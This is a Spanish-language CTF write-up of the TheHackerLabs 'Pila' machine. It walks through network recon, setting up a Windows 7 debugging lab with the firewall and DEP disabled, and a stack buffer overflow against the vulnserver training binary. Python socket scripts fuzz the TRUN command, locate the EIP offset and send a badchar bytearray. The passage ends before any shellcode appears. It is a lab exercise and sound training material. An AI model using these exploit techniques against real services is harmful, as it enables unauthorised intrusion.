---
title: "Pila - TheHackerLabs"
date: 2025-02-15
draft: false
slug: "THL-writeup-pila"
excerpt: "Esta es una máquina que ocupa bastante talacha. Después de realizar los escaneos, vamos a analizar la página web que resulta tener un mensaje en el código fuente. Dicho mensaje nos manda a un directorio de la página web en donde descargamos un binario y un archivo DLL. Investigando y probando el binario, nos damos cuenta de que tenemos que aplicar Buffer Overflow. Realizamos esto utilizando Immunity Debugger, una máquina virtual Windows 7 y la Librería mona.py. Aplicando el Buffer Overflow, ganamos acceso a la máquina como el usuario Administrador."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Windows", "Vulnserver Binary", "Buffer Overflow", "Buffer Overflow (x32) Stack Based", "Privesc - Buffer Overflow", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "nc"
  - "strings"
  - "grep"
  - "Máquina Virtual Windows 7"
  - "Immunity Debugger"
  - "mona.py"
  - "bcdedit.exe"
  - "python3"
  - "pattern_create.rb"
  - "pattern_offset.rb"
  - "msfvenom"
  - "nasm_shell.rb"
  - "rlwrap"
links:
  - "https://github.com/shamsher404/Buffer-Overflow-tools"
  - "https://github.com/stephenbradshaw/vulnserver?tab=readme-ov-file"
  - "https://www.infosecinstitute.com/resources/hacking/intro-to-fuzzing/"
  - "https://www.infosecinstitute.com/resources/penetration-testing/fuzzing-introduction-definition-types-and-tools-for-cybersecurity-pros/"
  - "https://askubuntu.com/questions/1483732/cant-install-wine32-on-ubuntu-23-04"
  - "https://windows-7-home-premium.uptodown.com/windows"
  - "https://github.com/kbandla/ImmunityDebugger"
  - "https://github.com/corelan/mona"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-pila/pila.jpg"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.1.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 13:37 CST
...
...
Nmap scan report for 192.168.1.100
Host is up (0.0023s latency).
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
...
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.1.0/24
Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.100	XX	PCS Systemtechnik GmbH
.
15 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.112 seconds (121.21 hosts/sec). 15 responded
```

Encontramos nuestro objetivo y es:`192.168.1.100`.

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.100
PING 192.168.1.100 (192.168.1.100) 56(84) bytes of data.
64 bytes from 192.168.1.100: icmp_seq=1 ttl=128 time=1.38 ms
64 bytes from 192.168.1.100: icmp_seq=2 ttl=128 time=0.634 ms
64 bytes from 192.168.1.100: icmp_seq=3 ttl=128 time=0.733 ms
64 bytes from 192.168.1.100: icmp_seq=4 ttl=128 time=0.999 ms

--- 192.168.1.100 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3020ms
rtt min/avg/max/mdev = 0.634/0.937/1.382/0.289 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.100 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 13:39 CST
Initiating ARP Ping Scan at 13:39
Scanning 192.168.1.100 [1 port]
Completed ARP Ping Scan at 13:39, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:39
Scanning 192.168.1.100 [65535 ports]
Discovered open port 139/tcp on 192.168.1.100
Discovered open port 445/tcp on 192.168.1.100
Discovered open port 80/tcp on 192.168.1.100
Discovered open port 135/tcp on 192.168.1.100
Discovered open port 49152/tcp on 192.168.1.100
Discovered open port 49153/tcp on 192.168.1.100
Discovered open port 9999/tcp on 192.168.1.100
Discovered open port 49157/tcp on 192.168.1.100
Discovered open port 49154/tcp on 192.168.1.100
Discovered open port 49156/tcp on 192.168.1.100
Discovered open port 49155/tcp on 192.168.1.100
Completed SYN Stealth Scan at 13:40, 37.62s elapsed (65535 total ports)
Nmap scan report for 192.168.1.100
Host is up, received arp-response (0.0017s latency).
Scanned at 2025-02-13 13:39:52 CST for 38s
Not shown: 47090 closed tcp ports (reset), 18434 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
9999/tcp  open  abyss        syn-ack ttl 128
49152/tcp open  unknown      syn-ack ttl 128
49153/tcp open  unknown      syn-ack ttl 128
49154/tcp open  unknown      syn-ack ttl 128
49155/tcp open  unknown      syn-ack ttl 128
49156/tcp open  unknown      syn-ack ttl 128
49157/tcp open  unknown      syn-ack ttl 128
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 37.89 seconds
           Raw packets sent: 176289 (7.757MB) | Rcvd: 47107 (1.884MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay pocos puertos abiertos de los que podamos investigar, me parece que la intrusión será por la página web, pero es curioso el **puerto 9999**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 80,135,139,445,9999,49152,49153,49154,49155,49156,49157 192.168.1.100 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 13:41 CST
Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 36.36% done; ETC: 13:44 (0:01:33 remaining)
Nmap scan report for 192.168.1.100
Host is up (0.0010s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.0

|_http-title: 404: archivo o directorio no encontrado.
|_http-server-header: Microsoft-IIS/7.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
9999/tcp  open  vulnserver    Vulnserver
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-02-13T19:42:41
|_  start_date: 2025-02-13T11:29:39
|_clock-skew: 2s
|_nbstat: NetBIOS name: WIN-LVJNVVHBWSR, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.89 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Me da curiosidad que la página web muestre un error en el escaneo. Además, parece que el **servicio SMB** no pide credenciales para poder entrar.

Y más curioso es el **puerto 9999** que lo muestra como **vulnserver**, quizá podamos conectarnos a este servidor.

Pero primero, vamos a ver la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura1.png">
</p>

Pues si verdad, marca un error.

Si revisamos el código fuente, encontraremos algo interesante:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura2.png">
</p>

Parece ser una ruta.

Vayamos a verla:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura3.png">
</p>

Parece que de aquí podemos descargar unos archivos, entre ellos un binario.

Descarguemos el binario y el **DLL**, los necesitaremos más adelante.

### Analizando Puerto 9999 y Binario vulnserver.exe Obtenido de Página Web {#Binario}

Si recordamos, hay un puerto activo con un servidor que se llama **vulnserver**, mismo nombre que tiene el binario.

Vamos a tratar de conectarnos a ese servidor usando **netcat**:
```bash
nc 192.168.1.100 9999
Welcome to Vulnerable Server! Enter HELP for help.
```
Bien, pudimos conectarnos.

Veamos qué comandos podemos usar:
```bash
nc 192.168.1.100 9999
Welcome to Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
```
Son bastantes.

Solo ejecutemos uno para ver que sucede:
```bash
STATS
UNKNOWN COMMAND
```
No ocurre nada.

Parece que estamos contra una máquina a la que podremos aplicar **Buffer Overflow**.

Para comprobarlo, vamos a buscar funciones del **lenguaje C y C++** que son vulnerables dentro del binario.

Lo haremos viendo el contenido del binario con el comando **strings** y buscando las funciones vulnerables comunes con **grep**:
```bash
strings vulnserver/vulnserver.exe | grep -E "strcpy|sprintf|gets|scanf|memcpy|strcat"
memcpy
strcpy
_memcpy
_strcpy
__imp__memcpy
__imp__strcpy
```
Excelente, es muy probable que podamos aplicar **Buffer Overflow**.

Te diría que revisáramos los otros servicios, pero ya te digo que debemos aplicar **Buffer Overflow** si o sí.

## Explotación de Vulnerabilidades {#Explotacion}

### Preparando Laboratorio de Pruebas {#Laboratorio}

Esto será un poco largo, ya que tendremos que realizar un laboratorio de pruebas con distintas herramientas. 

Esto es lo que necesitaras:
* Máquina virtual **Windows 7**: <a href="https://windows-7-home-premium.uptodown.com/windows" target="_blank">Windows 7 Premium</a>
* Herramienta **Immunity Debugger**: <a href="https://github.com/kbandla/ImmunityDebugger" target="_blank">Repositorio de kbandla: Immunity Debugger</a>
* Script **mona.py**: <a href="https://github.com/corelan/mona" target="_blank">Repositorio de corelan: mona.py</a>

Primero debemos preparar la máquina virtual y después instalamos lo demás.

#### Preparando Máquina Virtual Windows 7 {#Windows7}

La instalación es muy simple, pero lo importante es que debes recordar el usuario y contraseña que elijas.

Debes escoger la red **Home Network**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura6.png">
</p>

Puede que se vea muy chica la pantalla, por lo que puedes mejorar cambiando la resolución de la pantalla:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura4.png">
</p>

Además, algo opcional es que puedes descargar **Chrome** para trabajar mejor, pero eso ya es a tu criterio.

Debemos desactivar el **FireWall de Windows** como lo muestro en la siguiente imagen:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura5.png">
</p>

Por último, vamos a desactivar el **DEP (Data Execution Prevention)**, no sin antes dejar su definición:

| **DEP (Data Execution Prevention)** |
|:-----------:|
| *Es una característica de seguridad que protege contra ataques de ejecución de código en memoria. Su objetivo es evitar que un atacante ejecute código malicioso en regiones de memoria destinadas solo a datos, como la pila (stack) o el montículo (heap).* |

Para desactivarlo, usa el siguiente comando en una **CMD de administrador**:
```batch
bcdedit.exe /set {current} nx AlwaysOff
```
Y reinicia la máquina.

#### Instalando Immunity Debbuger {#Immunity}

Antes que nada, ¿qué es **Immunity Debugger**?

| **Immunity Debugger** |
|:-----------:|
| *Immunity Debugger es un depurador (debugger) de Windows diseñado específicamente para análisis de vulnerabilidades, exploit development y debugging de aplicaciones en modo usuario. Fue desarrollado por Immunity Inc. y combina un depurador gráfico con un potente motor de scripting en Python.* |

Una vez reiniciada, vamos a descargar la última versión que viene en el repositorio que compartí arriba.

Cuando lo ejecutemos, nos dirá que tenemos que tener instalado **Python 2.7** que no será necesario, ya que se instalara cuando terminemos de instalar el **Immunity Debbuger**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura7.png">
</p>

Tan solo debemos aceptar la licencia de uso y no hay que mover nada más:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura8.png">
</p>

Observa que terminando, nos pedirá permiso para instalar **Python 2.7**, así que sigue el wizard de instalación:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura9.png">
</p>

Y con esto, la instalación queda lista.

#### Instalando Librería mona.py {#Libmona}

Puedes descargar el script desde **GitHub** o puedes copiar el código en un archivo de texto y luego cambiar la extensión a **Python** desde una **CMD**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura10.png">
</p>

Una vez que lo tengas, debemos moverlo a la siguiente ruta que puede variar, aunque normalmente es la de **Program Files (x86)**: `C:/Program File o Program Files (x86)/Immunity Inc/Immunity Debbuger/PyCommands`.

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura11.png">
</p>

Y con esto, nuestro laboratorio está listo, ya solo debes pasar el binario a tu **máquina virtual Windows 7** y podemos comenzar a hacer pruebas.

### Aplicando Buffer Overflow a Binario vulnserver.exe {#Vulnserver}

Al igual que con la **máquina Fawkes**, estos son los pasos que yo considero, son los que se deben aplicar para realizar un **Buffer Overflow**:
* **Primero**: Identificar si un archivo encontrado es un binario.
* **Segundo**: Estudiar y analizar su funcionamiento.
* **Tercer**: Confirmar vulnerabilidad con herramienta **Immunity Debbuger**.
* **Cuarto**: Aplicar Fuzzing para detectar límites del binario.
* **Quinto**: Identificar el **offset**.
* **Sexto**: Identificar en qué parte de la memoria se están representando los caracteres introducidos.
* **Séptimo**: Generación de **Bytearrays**, creación de Exploit e identificación de **badchars**.
* **Octavo**: Creación de **Shellcode malicioso** y modificación de Exploit.
* **Noveno**: Búsqueda de **OpCode JMP ESP**.
* **Décimo**: Aplicación de **NOPs** y/o **desplazamiento de pila**.
* **Undécimo**: Prueba y ejecución de Exploit.

Los pasos pueden variar un poco.

En este momento ya realizamos el primer, segundo y tercer paso.

Por lo que vamos a comenzar con el tercer paso y de ahí en adelante.

#### Preparando Binario en Immunity Debbuger {#Immunity2}

Vamos a ejecutar el binario en nuestra **máquina Windows 7**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura12.png">
</p>

Puedes comprobar que se activa en el **puerto 9999**, conectándote desde tu máquina con **netcat**.

Abre **Immunity Debugger** como administrador:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura13.png">
</p>

Vamos a adjuntar el proceso del binario desde la pestaña **File**, luego seleccionamos la opción **Attach** y escogemos el proceso del binario:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura14.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura15.png">
</p>

Observa lo que pasa:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura16.png">
</p>

Cada vez que realices este proceso, debemos iniciar el proceso:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura17.png">
</p>

Recuerda bien este proceso, ya que lo repetiremos varias veces.

#### Cuarto Paso: Aplicando Fuzzing para Detectar Límites del Binario {#Cuarto}

Ahora bien, la idea es aplicar **Fuzzing** para descubrir en qué momento se crashea el binario.

Podemos hacerlo con 2 opciones, la primera es utilizar el spiker que hice en la **máquina Fawks**, pero modificado, o la segunda, utilizando los scripts de un repositorio específico para explotar este binario.

Primero lo haremos con mi script y luego con el spiker del repositorio.

Ahora probemos con mi script:
```python
#!/usr/bin/python3
import socket
import argparse

def parse_arguments():
        parser = argparse.ArgumentParser(description="Script para fuzzear binarios")
        parser.add_argument("--ip-addr", required=True, help="Dirección IP a utilizar")
        parser.add_argument("--port", type=int, required=True, help="Puerto a utilizar")

        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument("--length", type=int, help="Cantidad de A's a enviar")
        group.add_argument("--payload", type=str, help="Payload a enviar (texto)")

        return parser.parse_args()

def exploit(ip, port, length, payload):
        try:
                # Creando conexión vía TCP/IP
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                print(f"\n[+] Conectando a {ip}:{port}...\n")
                s.connect((ip, port))

                # Recibiendo banner
                banner = s.recv(1024)
                print(f"\n[+] Recibiendo Banner: \n------\n{banner.decode('utf-8', errors='ignore')}\n------\n")

                # Enviando payload, ya sea A's o uno del usuario
                if length:
                        payload_bytes = b"TRUN /.:/" + (b"A" * length) + b'\r\n'
                elif payload:
                        payload_bytes = b"TRUN /.:/" + payload.encode() + b'\r\n'

                print(f"[*] Payload Enviado: {payload_bytes}\n")
                s.send(payload_bytes)

		# Intentar recibir respuesta (manejar error si el servidor ya crasheó
                try:
                        response = s.recv(1024)
                        print(f"\n[+] Respuesta del servidor: {response.decode('utf-8', errors='ignore')}\n")
                except socket.timeout:
                        print("\n[!] No hay respuesta, el servidor podría haber crasheado.")

        # Manejo de errores
        except socket.error as e:
                print(f"[!] Error de conexión: {e}")

        except Exception as e:
                print(f"[!] Ocurrio un error: {e}")

        # Cerrando la conexión
        finally:
                s.close()
                print("\n[+] Cerrando conexión.")

if __name__ == '__main__':
        args = parse_arguments()
        exploit(args.ip_addr, args.port, args.length, args.payload)
```
Ha sido modificado para que tramite A's o un payload del usuario en conjunto al **comando TRUN** que utiliza el binario, esto porque este comando es el que lo crashea.

Probemos:

```bash
python3 spiker.py --ip-addr 192.168.1.100 --port 9999 --length 5900

[+] Conectando a 192.168.1.100:9999...

[+] Recibiendo Banner: 
------
Welcome to Vulnerable Server! Enter HELP for help.

------

[*] Payload Enviado: b'TRUN /.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...AAA\r\n'

[!] No hay respuesta, el servidor podría haber crasheado.

[+] Cerrando conexión.
```

Y podemos ver que se crashea:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura18.png">
</p>

Descarga el repo en tu máquina, ya que los otros scripts quizá los ocupemos:
* <a href="https://github.com/shamsher404/Buffer-Overflow-tools" target="_blank">Repositorio de shamsher404: Buffer-Overflow-tools</a>

Una vez que lo tengas, utiliza el **script 1-fuzzer.py**. Le debes indicar la IP de tu máquina virtual:
```bash
python3 1-fuzzer.py
Enter the IP address of the target: 192.168.1.100
Fuzzing vulnserver with 1 bytes 
Fuzzing vulnserver with 100 bytes 
Fuzzing vulnserver with 300 bytes 
Fuzzing vulnserver with 500 bytes 
Fuzzing vulnserver with 700 bytes 
Fuzzing vulnserver with 900 bytes 
Fuzzing vulnserver with 1100 bytes 
Fuzzing vulnserver with 1300 bytes 
Fuzzing vulnserver with 1500 bytes 
Fuzzing vulnserver with 1700 bytes 
Fuzzing vulnserver with 1900 bytes 
Fuzzing vulnserver with 2100 bytes 
Fuzzing vulnserver with 2300 bytes 
Fuzzing vulnserver with 2500 bytes 
Fuzzing vulnserver with 2700 bytes 
Fuzzing vulnserver with 2900 bytes 
Fuzzing vulnserver with 3100 bytes 
Fuzzing vulnserver with 3300 bytes 
Fuzzing vulnserver with 3500 bytes 
Fuzzing vulnserver with 3700 bytes 
Fuzzing vulnserver with 3900 bytes 
Fuzzing vulnserver with 4100 bytes 
Fuzzing vulnserver with 4300 bytes 
Fuzzing vulnserver with 4500 bytes 
Fuzzing vulnserver with 4700 bytes 
Fuzzing vulnserver with 4900 bytes 
Fuzzing vulnserver with 5100 bytes 
Fuzzing vulnserver with 5300 bytes 
Fuzzing vulnserver with 5500 bytes 
Fuzzing vulnserver with 5700 bytes 
Fuzzing vulnserver with 5900 bytes
```
Parece que crashea a los **5900 bytes**.

Y observa el **Immunity Debugger**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura18.png">
</p>

Nos indica que el binario se crasheo y podemos ver que se tramitaron muchas A's.

#### Quinto Paso: Identificando el offset del Binario vulnserver.exe {#Quinto}

Desde aquí, podemos identificar el **offset** que es el número exacto de bytes que necesitas para sobrescribir el **EIP**.

Podemos generar un patrón de distintos caracteres para que sea más fácil identificar el **offset**.

Para esto, vamos a usar una herramienta de **Metasploit pattern_create.rb** para generar **5900 bytes** aleatorios que mandaremos al binario para crashearlo.

Los mandaremos al binario para que se crashee y luego copiaremos el **EIP** resultante, para que con la herramienta de **Metasploit pattern_offset.rb**, podamos descubrir la cantidad exacta de bytes que debemos usar para crashear el binario.

Empecemos por crear los **5900 bytes aleatorios**:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5900
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4...
...
...
...
```

Mandamos el payload utilizando mi script:
```bash
python3 spiker.py --ip-addr 192.168.1.100 --port 9999 --payload "Aa0Aa1Aa2Aa3Aa4Aa5...
[+] Conectando a 192.168.1.100:9999...

[+] Recibiendo Banner: 
------
Welcome to Vulnerable Server! Enter HELP for help.

------

[*] Payload Enviado: b'TRUN /.:/Aa0Aa1Aa2Aa3....

[!] No hay respuesta, el servidor podría haber crasheado.

[+] Cerrando conexión.
```

Observa el resultado en el **Immunity Debugger**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura19.png">
</p>

Vamos a copiar el **EIP** y usaremos **pattern_offset.rb** para descubrir la cantidad exacta de bytes que debemos usar:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337
[*] Exact match at offset 2003
```
Parece que solo necesitamos **2003 bytes**.

Vamos a comprobarlo:

```bash
python3 spiker.py --ip-addr 192.168.1.100 --port 9999 --length 2003

[+] Conectando a 192.168.1.100:9999...

[+] Recibiendo Banner: 
------
Welcome to Vulnerable Server! Enter HELP for help.

------

[*] Payload Enviado: b'TRUN /.:/AAAAAAAAAAAAAAAAAAAAAA....AAAAAAA\r\n'

[!] No hay respuesta, el servidor podría haber crasheado.

[+] Cerrando conexión.
```

Y listo, hemos crasheado el binario con la cantidad exacta de bytes:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura20.png">
</p>

Observa como el **EIP y el EBP** y como se ve un poco vacío a diferencia de las otras pruebas.

#### Sexto Paso: Identificando Ubicación de Representación de Caracteres {#Sexto}

Recordemos que estos registros son los que nos importan, pues son los registros de CPU hacia los cuales se puede dirigir el **Buffer Overflow** y ejecutar las instrucciones a bajo nivel que deseamos:

* *EIP*: indica la siguiente dirección de memoria que el ordenador debería ejecutar.
* *EAX*: almacena temporalmente cualquier dirección de retorno.
* *EBX*: almacena datos y direcciones de memoria.
* *ESI*: contiene la dirección de memoria de los datos de entrada.
* *ESP*: se usa para referenciar el inicio de un hilo.
* *EBP*: indica la dirección de memoria del final de un hilo.

Más específicos, nos interesan estos dos: **EIP, EBP y ESP**.

Podemos confirmar que, después del **offset**, se reescribe el **EIP** y luego se escriben más caracteres.

Con **Python**, podemos generar varios caracteres para cumplir con el **offset**, **sobreescribir el EIP** y registrar n cantidad de caracteres después:
```bash
python3 -c 'print("A"*2003 + "B"*4 + "C"*100)'
```

Y vamos a mandar este payload usando mi script:
```bash
python3 spiker.py --ip-addr 192.168.1.100 --port 9999 --payload "AAAAAAAAAAAAAAA....AAAAAAAAABBBBCCCCC..."

[+] Conectando a 192.168.1.100:9999...

[+] Recibiendo Banner: 
------
Welcome to Vulnerable Server! Enter HELP for help.

------

[*] Payload Enviado: b'TRUN /.:/AAAAAAAAAAAAAAAAAAAAA.....AAAAAAAABBBBCCCCC...CCCC\r\n'

[!] No hay respuesta, el servidor podría haber crasheado.

[+] Cerrando conexión.
```

Observa el **Immunity Debugger**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura21.png">
</p>

Ve que el **EBP** muestra A's y el **EIP** muestra las B's. Con esto ya vimos que pudimos sobreescribir el **EIP**.

Ahora probemos con el 3er script, que ya tiene la cantidad exacta de bytes para sobreescribir el **EIP**:
```bash
python 3-overwriteEIP.py
Enter the server IP address: 192.168.1.100
Fuzzing with TRUN command 2007 bytes
```

Y observa el **Immunity Debugger**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura22.png">
</p>

Nota que si se sobreescribe el **EIP**.

#### Séptimo Paso: Generación de Bytearrays, Creación de Exploit y Detección de Badchars {#Septimo}

Primero, vamos a entender estos dos conceptos: **Bytearrays y Badchars**.

¿Qué son los **Bytearrays**?

| **Bytearrays** |
|:-----------:|
| *Un bytearray es una secuencia de bytes que puede modificarse. Se utiliza para manejar datos binarios en lugar de cadenas de texto. En Python, los bytearray son especialmente útiles para manipular exploits, shellcodes y datos en bruto.* |

¿Qué son los **Badchars**?

| **Badchars** |
|:-----------:|
| *Los Badchars (o caracteres problemáticos) son bytes específicos que pueden romper la ejecución de un exploit o shellcode. Estos caracteres pueden interferir en la inyección de código o causar errores inesperados en una aplicación vulnerable.* |

La idea, es generar diferentes **Bytearrays** de casi todos los caracteresm desde **Immunity Debugger** con **mona.py** y con estos, identificar las **Badchars** que el binario no logra interpretar.

Vamos a generar los **Bytearrays**.

Desde **Immunity Debugger**, vamos a crear un espacio de trabajo con tal de tener un orden.

Desde la barra de comandos, comprobamos que está instalado el módulo **mona.py**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura25.png">
</p>

Sí está instalado.

Ahora, ejecutamos el siguiente comando que va a usar un directorio para guardar los **Bytearrays**:
```bash
!mona config -set workingfolder C:\Users\tu_usuario\Desktop\directorio_que_quieras
```

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura23.png">
</p>

Ahora, vamos a generar los **Bytearrays**, eliminando un **null byte** que nos puede dar problemas si lo dejamos, con el siguiente comando:
```bash
!mona bytearray -cpb '\x00'
```

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura24.png">
</p>

Ya los tenemos.

Copia el archivo de los **Bytearrays** en tu máquina o solamente copia los bytes que se muestran en el archivo.

Vamos a empezar a generar nuestro Exploit, para poder mandar esos bytes y crashear el binario (esto ya está hecho en el script 4 del repositorio que descargamos antes, así que puedes usar ese en lugar de mi script).

Debería quedar así:
```python
#!/usr/bin/python3

import socket

# Variables globales
ip_addr = "IP_máquina_windows"
port = 9999
offset = 2003
before_eip = b"A"*offset
eip = b"B"*4

shellcode =  (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

after_eip = shellcode

payload = b"TRUN /.:/" + before_eip + eip + after_eip

def exploit():

        # Creando conexión y enviando shellcode
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)

        s.connect((ip_addr, port))

        # Recibiendo banner
        banner = s.recv(1024)
        print(f"\n[+] Recibiendo Banner: \n------\n{banner.decode('utf-8', errors='ignore')}\n------\n")

        # Enviando payload
        s.send(payload)

        # Respuesta de servidor
	response = s.recv(1024)
        print(f"\n[+] Respuesta del servidor: {response.decode('utf-8', errors='ignore')}\n")

	# Cerrando conexión
        s.close()

if __name__ == '__main__':

        exploit()
```
Ya que lo tengas, ejecútalo.

Bien, podemos ver que crasheo el binario.

